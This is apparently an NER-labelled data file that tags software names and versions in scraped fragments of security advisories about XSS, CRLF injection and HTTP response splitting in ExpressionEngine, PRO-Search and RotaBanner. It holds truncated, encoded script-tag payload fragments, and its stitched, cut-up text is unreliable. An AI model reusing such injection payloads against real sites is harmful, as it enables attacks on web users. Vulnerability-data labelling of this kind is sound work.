be O
edited O
in O
any O
way O
without O
express O
consent O
of O
Minded O
Security O
Research O
Lab O
. O

Copyright O
( O
c O
) O
2008 O
Minded O
Security O
, O
S.r.l.. O
All O
rights O
reserved O
worldwide O
. O

Confirmed O
21/01/2008 O
Coordinated O
public O
disclosure O
22/01/2008 O
Minded O
Security O
Research O
Lab O
Advisory O
[ O
Reference O
] O
Divide O
and O
Conquer O
, O
HTTP O
Response O
Splitting O
, O
Web O
Cache O
Poisoning O
Attacks O
, O
and O
Related O
Topics O
, O
Amit O
Klein O
, O
March O
2004. O
f O
[ O
Disclaimer O
] O
The O
information O
within O
this O
paper O
may O
change O
without O
notice O
. O

Apache O
mod_negotiation O
Xss O
and O
Http O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
index.php O
in O
ExpressionEngine SN
1.2.1 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
URL O
parameter O
. O

|+ O
oQQo O
ZARAZA O
U O
3APA3A O
} O
You O
know O
my O
name O
- O
look O
up O
my O
number O
( O
The O
Beatles O
) O
+ O
o66o O
+ O
|/ O

Crossite O
scripting O
and O
Denial O
of O
Service O
in O
PRO-Search SN
< SV
= SV
0.17 SV
XSS O
: O
ipt O
% O
3E O
t O
% O
3E O
Denial O
of O
Service O
: O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
4 O
. O

RotaBanner SN
Local SN
< SV
= SV
3 SV
crossite O
scripting O
C/script O
% O
3E O
) O
% O
3C/script O
% O
3E O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
6 O
. O

< O
= O
2.5d O
Original O
article O

Exploits O
: O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
5 O
. O

